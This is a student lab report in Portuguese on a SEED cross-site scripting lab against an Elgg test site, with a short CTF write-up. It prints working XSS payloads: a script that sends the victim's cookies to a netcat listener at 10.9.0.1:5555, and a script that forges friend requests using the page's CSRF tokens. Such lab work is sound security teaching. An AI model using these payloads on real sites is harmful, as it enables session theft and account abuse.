# Trabalho realizado na Semana #10

## Tarefa 1
Efetuou-se o *log in* na plataforma http://www.seed-server.com sob o perfil de Alice forncido. Para efetuar o XSS, alterou-se a secção *Brief Description* para o código indicado. 

![/imgs10/brief.png](/imgs10/brief.png)

Imediamente após o guardar das alterações, como esperado, obteve-se o *pop-up*:

![/imgs10/popup.png](/imgs10/popup.png)

Experimentou-se também com o exemplo usando um *form* e apesar de apenas se usar um *link* exemplificativo, pode comprovar-se que efetivamente funcionaria: 

![/imgs10/withForm.png](/imgs10/withForm.png)

## Tarefa 2

Alterou-se novamente a secção *Brief Description* desta vez para:
``` js
<script>alert(document.cookie);</script>
```

Como resultado, surgiu o *pop up* com as *cookies* do utilizador mal as alterações foram guardadas.

![/imgs10/cookies.png](/imgs10/cookies.png)

## Tarefa 3

Inicialmente, na *shell*, correu-se o seguinte comando por forma a iniciar o servidor TCP:
``` shell
nc -lknv 5555
```

Seguidamente mudou-se *Brief Description* para efetuar o ataque:

``` js
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >'); </script>
```

Após guardar as alterações no perfil, verificou-se a chegada das *cookies* do utilizador autenticado, neste caso, da Alice ao terminal onde se tinha iniciado o servidor.

![/imgs10/cookiesAlice.png](/imgs10/cookiesAlice.png)

Por forma a melhor testar a solução encontrada, efetuou-se a autenticação de Boby e acedeu-se ao perfil de Alice.

Sem surpresa, chegou ao terminal as cookies de Boby.

![/imgs10/cookiesBoby.png](/imgs10/cookiesBoby.png)


## Tarefa 4

Por forma a perceber como executar o ataque, foi necessário compreender como funciona o mecanismo de adicionar um amigo. Com a ferramenta *HTTP Header Live* detetaram-se pedidos deste género a cada novo amigo:

![/imgs10/amizadeAliceBob.png](/imgs10/amizadeAliceBob.png)

Com a repetição de pedidos percebeu-se que a variável *friend* era igual a um identificador para a pessoa que se queria adicionar como amiga. Por outro lado, a restante parte do *link* era constituída pela sequência *ts*, *token*, *ts* e *token* que são calculados no *script* fornecido. Como tal, bastava modificar o script para

```js
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>
```

e colocá-lo na secção *About me* do perfil do Samy. 

Como espectável, iniciando sessão como outro utilizador e visitanto o perfil de *Samy* este é adicionado como amigo,

![/imgs10/sammyFriend.png](/imgs10/sammyFriend.png)


### Questão 1

Em Elgg, as todas as ações requerem *tokens* CSRF (por questões de segurança) que, por vezes, têm de ser gerados manualmente. As linhas 1 e 2 são a geração destes *tokens*. Mais informações sobre estes *tokens* podem ser vistas no seguinte link: http://learn.elgg.org/en/stable/guides/actions.html#security

### Questão 2

Se apenas fosse usado *Editor Mode*, o texto inserido teria os sues carateres especiais "<", ">" codificados como se mostra abaixo.

![/imgs10/editorMode.png](/imgs10/editorMode.png)

Desta forma, o código não seria reconhecido como *script* e, logo, não seria possível corrê-lo.

## CTF - Desafio 1
O enunciado sugere que o formulário de se procurem fragilidades no formulário de submissão. 

Tentou-se *SQLInjection* sem sucesso. Com mais sucesso, ao colocar 
``` js
<script> alert("hello");</script>
```

surgiu no ecrã :

![/imgs10/alert.png](/imgs10/alert.png)

Pode-se assim concluir que o *site* é vulnerável a *XSS*.

Surgiu assim a questão de que código injetar. Reparou-se num botão muito sugestivo *Give the flag*.

Desta forma tentou-se replicar o comportamento deste botão em *JavaScript*. 

Assim, injetou-se o seguinte código no formulário: 

``` js
<script> getFlag = function () {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "POST", "");
    xmlHttp.send("giveflag");
    return xmlHttp.responseText; }; 
    console.log(getFlag())
    </script>
```

Inicialmente, nada surgiu, mas, mal o pedido foi avaliado, a *flag* surgiu no ecrã

![/imgs10/flag1.png](/imgs10/flag1.png)


## CTF - Desafio 2